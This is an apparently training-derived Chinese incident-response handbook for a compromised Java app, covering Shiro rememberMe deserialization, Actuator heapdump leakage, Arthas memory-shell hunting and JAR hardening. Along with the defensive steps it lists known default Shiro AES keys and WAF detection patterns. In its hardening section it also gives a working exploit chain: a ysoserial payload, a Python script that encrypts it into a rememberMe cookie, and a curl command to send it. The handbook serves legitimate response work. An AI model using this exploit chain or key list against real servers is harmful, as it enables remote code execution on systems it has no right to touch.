# Shiro 反序列化与 heapdump 泄漏应急手册

> 培训内容深化整理：Shiro 反序列化利用链、heapdump 泄漏利用、Arthas 内存马查杀、JAR 加固完整流程。
> 适用场景：综合防御竞赛靶机 Java 应用被攻陷后的应急响应。

## 一、攻击链总览

```
信息收集 (fscan)
  ↓
发现 /actuator/heapdump
  ↓
下载 heapdump → JDumpSpider 提取 Shiro Key
  ↓
Shiro 利用工具构造 rememberMe 反序列化 payload
  ↓
执行命令 / 注入内存马 (AntSwordServlet)
  ↓
Arthas 持久化 / 横向移动
```

## 二、heapdump 泄漏

### 2.1 发现端点

```bash
# fscan 扫描
fscan -h 10.103.111.49 -p 8080

# 输出示例：
# [+] http://10.103.111.49:8080/actuator/heapdump
# [+] http://10.103.111.49:8080/actuator/env
```

### 2.2 下载与提取

```bash
# 下载 heapdump 文件
curl -o heapdump http://target:8080/actuator/heapdump

# 用 JDumpSpider 提取敏感信息
java -jar JDumpSpider-1.1-SNAPSHOT-full.jar heapdump > info.txt
```

**JDumpSpider 可提取**：
- Shiro Key（`rememberMeManager.setCipherKey` 的 16 字节 Base64）
- 数据库密码（DataSource Bean）
- Redis 密码
- Spring 环境变量（含 AK/SK）
- Session 信息

### 2.3 培训案例中的 Shiro Key

```
GAYysgMQhG7/CzIJlVpR2g==
```

这是常见的默认 key 之一，攻击者可直接用此 key 构造 payload。

### 2.4 MAT 辅助分析

当 Arthas jad 反编译路径/密码不准时，用 MAT 分析动态 heapdump：

```bash
# Arthas 导出 heapdump
arthas> heapdump /tmp/heapdump.hprof
```

下载到本地用 MAT 打开，执行 OQL：

```sql
-- 查找所有 AntSword 内存马实例
SELECT * FROM instanceof com.summersec.x.AntSwordServlet

-- 查找 Shiro rememberMe 配置
SELECT * FROM org.apache.shiro.web.mgt.CookieRememberMeManager

-- 查找所有 Filter 实例
SELECT * FROM instanceof javax.servlet.Filter
```

## 三、Shiro 反序列化利用

### 3.1 原理

Shiro `rememberMe` Cookie 使用 AES-CBC 加密：
1. 服务端有固定的 16 字节 AES key
2. 攻击者用默认 key 加密序列化的恶意对象
3. 服务端反序列化 Cookie → 触发命令执行

### 3.2 常见默认 Key 列表

```
kPH+bIxk5D2deZiIxcaaaA==     # Shiro 1.2.4 默认
ZAvph3dsQs0FSL3MDFLgGw==
wGiHplabyXjY7d9zXJlJmg==
2AvVhdsgUs0FSA3SDFAdag==
WcfHg267b5J9t8fgjSBMsA==
fCq+/xM4859APehbAFp3UQ==
a2Vpbg==                       # "keib" 的 Base64
4AvVhmFLUs0KTA3Kprsdag==
WctBheLzYxGdAPGW5owdrw==
GAYysgMQhG7/CzIJlVpR2g==      # 培训案例
Z3VucwAAAAAAAAAAAAAAAA==       # "guns"
```

### 3.3 利用工具

- **ysoserial**：生成反序列化 payload
- **ShiroExploit / shiro_attack**：图形化 Shiro 利用工具
- **Burp 插件 shiroPoc**：手动注入

### 3.4 WAF 拦截特征

| 规则 ID | 特征 | 说明 |
|---|---|---|
| `java_7` | `rememberMe=[A-Za-z0-9+/=]{200,}` | 反序列化 payload 通常很长 |
| `java_8` | `rememberMe=deleteMe` | 探测 Shiro 指纹 |
| `java_5` | `rememberMe=` 通用 | 已有的通用规则 |

## 四、内存马查杀（Arthas）

### 4.1 上传 Arthas

```bash
scp -r arthas-bin root@10.103.254.16:/tmp

# 定位 Java 路径
find / -name java 2>/dev/null

# 启动
/usr/local/openjdk-8/bin/java -jar arthas-boot.jar
```

### 4.2 排查命令序列

```arthas
# 1. 搜索已加载的可疑类
sc *Servlet
sc *Filter
sc *Listener
sc *Interceptor

# 2. 定位 AntSword 内存马
sc com.summersec.x.AntSwordServlet
jad com.summersec.x.AntSwordServlet

# 3. 查看详细信息（类加载器、代码来源）
sc -d com.summersec.x.AntSwordServlet
```

### 4.3 验证与清除

```arthas
# 反编译源码（注意路径/密码可能不准）
jad com.summersec.x.AntSwordServlet

# 导出 heapdump 配合 MAT 精确定位
heapdump /tmp/heapdump.hprof
```

MAT 中执行：
```sql
SELECT * FROM instanceof com.summersec.x.AntSwordServlet
```

与注入的内存马实例对应，确认内存马存在。

## 五、JAR 加固完整流程

### 5.1 解包

```bash
mkdir app_unpack
cd app_unpack
unzip -o ../app.jar
```

### 5.2 漏洞点 1：Shiro Key 修复

**审计**：用 jd-gui 打开 JAR

```bash
# 图形化（桌面环境）
java -jar jd-gui-1.6.6.jar
```

搜索 `setCipherKey` / `setRememberMeManager`，定位到：
```java
rememberMeManager.setCipherKey(Base64.decode("GAYysgMQhG7/CzIJlVpR2g=="));
```

**无 GUI 替代**（SSH 远程 / 容器 / 最小化服务器）：

```bash
# 用 CFR 命令行反编译（推荐）
wget https://github.com/leibnitz27/cfr/releases/download/0.152/cfr-0.152.jar -O /tmp/cfr.jar
java -jar /tmp/cfr.jar app.jar --outputdir /tmp/app_src/

# 搜索 Shiro key 设置点
grep -rn "setCipherKey\|setRememberMeManager\|Base64.decode" /tmp/app_src/

# 直接 strings 提取 JAR 中的 Base64 候选（不反编译，快速定位）
unzip -p app.jar | grep -aoE '[A-Za-z0-9+/]{22}==' | sort -u
# 输出 GAYysgMQhG7/CzIJlVpR2g== 等候选 key
```

**ShiroExploit GUI 工具的 CLI 替代**：

```bash
# ShiroExploit 是 GUI 利用工具，无头环境改用 ysoserial + 手写脚本
# 1. 用 ysoserial 生成 CommonsCollections 链 payload
java -jar ysoserial.jar CommonsCollections2 "whoami" > payload.bin

# 2. 用默认 key 加密为 Shiro Cookie（Python 脚本）
pip install pycryptodome
python3 << 'EOF'
import base64, uuid
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad

# Shiro 默认 key
key = base64.b64decode('GAYysgMQhG7/CzIJlVpR2g==')
# IV 随机（CBC 模式）
iv = uuid.uuid4().bytes
cipher = AES.new(key, AES.MODE_CBC, iv)

# 读取 ysoserial 生成的 payload
with open('payload.bin', 'rb') as f:
    payload = f.read()

encrypted = iv + cipher.encrypt(pad(payload, AES.block_size))
cookie = base64.b64encode(encrypted).decode()
print(f'rememberMe={cookie}')
EOF

# 3. 用 curl 发送（无 GUI 验证）
curl -b "rememberMe=<上面输出的值>" http://target:8080/
```

**修复**：用 010 编辑器或 sed 替换为新 key

```bash
# 生成新 key（16 字节随机 Base64）
openssl rand -base64 16
# 输出示例：xT3bN9kLp2Q8wR5mY1aVcA==

# 在 class 文件中替换（注意字节长度一致）
# 或在 application.yml 中配置：
# shiro:
#   cipherKey: xT3bN9kLp2Q8wR5mY1aVcA==
```

### 5.3 漏洞点 2：heapdump 端点关闭

```bash
cat BOOT-INF/classes/application.properties
```

**修改前**：
```properties
management.endpoints.web.exposure.include=*
management.endpoints.web.exposure.exclude=
```

**修改后**：
```properties
management.endpoints.web.exposure.include=*
management.endpoints.web.exposure.exclude=env,heapdump
```

> 注意：`include=*` 保留（业务可能需要 health），只把 `heapdump`、`env` 加入 exclude。

### 5.4 重新封装

```bash
# c0fm：c=创建 0=不压缩 f=指定文件名 m=带 manifest
jar c0fm ./app_new.jar META-INF/MANIFEST.MF -C . .
```

### 5.5 部署与验证

```bash
mv app.jar app.jar.bak
mv app_new.jar app.jar

# 重启服务
systemctl restart <service>

# 验证
curl http://target:8080/actuator/heapdump    # 应 404
curl http://target:8080/actuator/env         # 应 404
# 用旧 Shiro payload 测试 → 应失效
```

## 六、应急响应决策树

```
发现 Java 站点被攻陷
  ↓
是否暴露 /actuator/heapdump?
  ├─ 是 → 立即下载备份证据 → 关闭端点（java_actuator_off）
  └─ 否 → 检查 Shiro 版本与默认 key（java_shiro_key）
  ↓
是否检测到内存马?
  ├─ 是 → Arthas 排查（java_memshell_scan）→ MAT 确认 → 重启应用
  └─ 否 → 检查 webapps 目录是否有 JSP webshell
  ↓
是否泄漏了 Shiro key?
  ├─ 是 → 轮换 key（解包重封 jar）
  └─ 否 → 加固 Actuator、Tomcat、账号
  ↓
全量日志审计 + 告警复核
```

## 七、相关加固项

| 加固项 ID | 作用 |
|---|---|
| `java_actuator_off` | 关闭 heapdump/env 端点 |
| `java_shiro_key` | Shiro 默认 key 扫描 |
| `java_memshell_scan` | Arthas 内存马扫描 |
| `java_heapdump_clean` | 清理已落盘的 heapdump |
| `java_jar_audit` | JAR 配置与依赖审计 |

## 八、参考

- 培训 PDF：应急响应.pdf（Shiro反序列化+heapdump泄漏、Shiro-内存马查杀章节）
- Shiro CVE-2016-4437：https://shiro.apache.org/
- ysoserial：https://github.com/frohoff/ysoserial
- JDumpSpider：https://github.com/whwlsfb/JDumpSpider
